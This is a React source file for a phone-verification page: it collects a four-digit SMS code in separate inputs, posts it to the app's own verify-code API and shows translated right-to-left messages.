import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import PC from '../components/PC';
import {API_URL} from "../utils/constans"; // PC Component
import { useLanguage } from '../components/LanguageContext'; // Import the useLanguage hook

function PhoneVerifyPage() {
    const location = useLocation();
    const navigate = useNavigate();
    const { requestId, phone, codeN } = location.state || {};
    const { translation } = useLanguage(); // Access translation from the context

    const [verificationCode, setVerificationCode] = useState({
        digit1: '',
        digit2: '',
        digit3: '',
        digit4: ''
    });
    const [verificationError, setVerificationError] = useState(false);
    const [isSubmitting, setIsSubmitting] = useState(false);

    const handleInputChange = (e) => {
        const { name, value } = e.target;
        setVerificationCode((prev) => ({
            ...prev,
            [name]: value
        }));
        moveFocus(e); // Move focus to the next input
    };

    const handleSubmit = async (e) => {
        e.preventDefault();
        setIsSubmitting(true);
        const enteredCode = Object.values(verificationCode).join('');

        try {
            const response = await axios.post(`${API_URL}/verify-code`, {
                requestId,
                phone: codeN + phone,
                code: enteredCode
            });

            if (response.data.success) {
                navigate('/thankyou');
            } else {
                setVerificationError(true);
            }
        } catch (error) {
            console.error('Error verifying code:', error);
            setVerificationError(true);
        } finally {
            setIsSubmitting(false);
        }
    };

    const moveFocus = (e) => {
        const input = e.target;
        if (input.value.length >= input.maxLength) {
            const nextInput = input.nextElementSibling;
            if (nextInput && nextInput.tagName === 'INPUT') {
                nextInput.focus();
            }
        }
    };

    return (
        <div className="container">
            <div className="row">
                <PC /> {/* Include PC component */}
                <div className="right-col">
                    <div className="phone-case">
                        <img src="/images/phone.png" alt={translation.phoneCaseAlt} />
                        <div className="phone-screen">
                            <div className="content">
                                <form onSubmit={handleSubmit} className={verificationError ? 'incorrect' : 'correct'}>
                                    <h2 dir="rtl">{translation.verifyTitle}</h2>
                                    <label dir="rtl">{translation.phoneLabel}</label>
                                    <span>{codeN + phone}</span>
                                    <p dir="rtl">{translation.enterCode}</p>
                                    <div className="input_digits">
                                        <input
                                            type="number"
                                            name="digit1"
                                            maxLength="1"
                                            inputMode="numeric"
                                            onInput={handleInputChange}
                                            required
                                        />
                                        <input
                                            type="number"
                                            name="digit2"
                                            maxLength="1"
                                            inputMode="numeric"
                                            onInput={handleInputChange}
                                            required
                                        />
                                        <input
                                            type="number"
                                            name="digit3"
                                            maxLength="1"
                                            inputMode="numeric"
                                            onInput={handleInputChange}
                                            required
                                        />
                                        <input
                                            type="number"
                                            name="digit4"
                                            maxLength="1"
                                            inputMode="numeric"
                                            onInput={handleInputChange}
                                            required
                                        />
                                    </div>
                                    <br /><br />
                                    <button type="submit" dir="rtl" disabled={isSubmitting}>
                                        {verificationError ? translation.retry : translation.confirm}
                                    </button>
                                    {verificationError && (
                                        <p dir="rtl" style={{ color: 'red' }}>
                                            {translation.invalidCode}
                                        </p>
                                    )}
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
}

export default PhoneVerifyPage;
